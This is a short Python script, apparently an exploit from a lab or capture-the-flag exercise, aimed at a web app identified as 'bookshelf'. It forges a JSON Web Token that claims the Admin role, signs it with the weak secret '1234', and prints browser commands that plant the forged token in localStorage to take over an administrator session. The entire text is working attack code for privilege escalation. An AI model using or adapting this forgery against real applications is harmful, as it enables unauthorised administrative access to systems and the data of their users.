import jwt
import json

payload = {'role':'Admin','iss':'bookshelf','exp':1765339195,'iat':1764734395,'userId':2,'email':'admin'}

token = jwt.encode(
    payload=payload,
    key="1234",
    algorithm="HS256",
    headers={"typ": "JWT", "alg": "HS256"}
)

print(f"""
localStorage['token-payload'] = '{json.dumps(payload)}';
localStorage['auth-token'] = '{token}'
""".strip())